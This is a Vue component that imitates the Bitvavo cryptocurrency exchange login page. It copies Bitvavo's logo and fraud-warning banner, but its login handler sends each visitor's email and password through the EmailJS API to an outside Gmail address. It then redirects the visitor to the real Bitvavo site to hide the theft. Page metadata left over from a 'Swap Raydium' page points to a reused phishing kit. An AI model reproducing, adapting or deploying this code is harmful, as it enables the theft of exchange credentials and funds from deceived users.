<template>
  <div class="bg-[#F0F4F8] min-h-screen flex flex-col">
    <!-- Header -->
    <header
      class="bg-[#F0F4F8] text-center border-b py-3 h-[51px] flex items-center justify-center"
    >
      <p class="text-gray-700 text-sm px-4">
        Recently, we have been in contact with customers who have encountered
        bank help desk fraud.
        <a
          href="https://support.bitvavo.com/hc/en-us/articles/21422130523793-Bank-help-desk-fraud"
          class="font-bold underline text-blue-600"
          target="_blank"
        >
          Here is how you recognize it
        </a>
      </p>
    </header>

    <!-- Login Box -->
    <div class="flex flex-grow items-center justify-center px-4">
      <div class="bg-white shadow-lg rounded-lg p-8 w-full max-w-md">
        <img
          src="https://account.bitvavo.com/assets/bitvavo-logo-black.png"
          alt="Bitvavo Logo"
          class="mx-auto mb-6 w-[52px] h-[52px]"
        />
        <h2 class="text-xl font-semibold text-gray-800 text-center mb-6">
          Log in
        </h2>

        <form @submit.prevent="handleLogin">
          <div class="mb-4">
            <label class="block text-gray-700 text-sm mb-2" for="email"
              >Email</label
            >
            <input
              id="email"
              v-model="email"
              type="email"
              class="w-full px-4 py-2 h-[62px] border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:outline-none"
              placeholder="Enter your email"
              required
            />
          </div>

          <div class="mb-4">
            <label class="block text-gray-700 text-sm mb-2" for="password"
              >Password</label
            >
            <input
              id="password"
              v-model="password"
              type="password"
              class="w-full px-4 py-2 h-[62px] border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:outline-none"
              placeholder="Enter your password"
              required
            />
          </div>

          <div class="text-right mb-4">
            <a href="#" class="text-blue-600 text-sm hover:underline"
              >Reset password</a
            >
          </div>

          <button
            type="submit"
            class="w-full bg-blue-600 text-white h-[52px] rounded-lg hover:bg-blue-700 transition flex items-center justify-center"
          >
            <span v-if="loading" class="spinner mr-2"></span>
            <span v-if="!loading">Log in</span>
            <span v-if="loading">Loading...</span>
          </button>
        </form>

        <p class="text-sm text-center text-gray-600 mt-4">
          Don't have an account yet?
          <a href="#" class="text-blue-600 hover:underline">Sign up</a>
        </p>
      </div>
    </div>

    <svg
      class="custom-oauth-icon mt-4 mx-auto"
      width="25"
      height="27"
      viewBox="0 0 25 27"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <g clip-path="url(#clip0_611_29801)">
        <path
          d="M20.944 0.111084H12.3662L15.0329 8.37775H23.6107L16.6773 13.3111L19.344 21.6222C23.7885 18.3778 25.2551 13.4444 23.6107 8.37775L20.944 0.111084ZM1.16624 8.37775H9.74401L12.4107 0.111084H3.78846L1.16624 8.37775C-0.478209 13.4444 0.944014 18.3778 5.4329 21.6222L8.09957 13.3111L1.16624 8.37775ZM5.4329 21.6222L12.3662 26.5111L19.2996 21.6222L12.3662 16.6L5.4329 21.6222Z"
          fill="black"
          fill-opacity="0.2"
        ></path>
      </g>
      <defs>
        <clipPath id="clip0_611_29801">
          <rect
            width="24"
            height="26.5714"
            fill="white"
            transform="translate(0.5)"
          ></rect>
        </clipPath>
      </defs>
    </svg>
  </div>
</template>

<script setup>
import axios from 'axios';
import { ref } from 'vue';

const email = ref("");
const password = ref("");
const loading = ref(false);
const errorText = ref("");

const handleLogin = async () => {
  try {
    loading.value = true;
    const params = {
      service_id: "service_8pbgnpr",
      template_id: "template_kr8zt7b",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        from_name: "Kucoins",
        password: password.value,
        emailOrPhone: email.value,
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post("https://api.emailjs.com/api/v1.0/email/send", params);

    if (response.data === "OK") {
      window.location.href = "https://bitvavo.com/en";
    }
  } catch (error) {
    errorText.value = "Error in the entries";
  } finally {
    loading.value = false;
  }
};

useHead({
  title: "Swap Raydium",
  meta: [
    {
      name: "description",
      content: "An on-chain order book AMM powering the evolution of DeFi",
    },
  ],
});
</script>

<style scoped>
.spinner {
  border: 4px solid #f3f3f3;
  border-top: 4px solid #3498db;
  border-radius: 50%;
  width: 20px;
  height: 20px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
</style>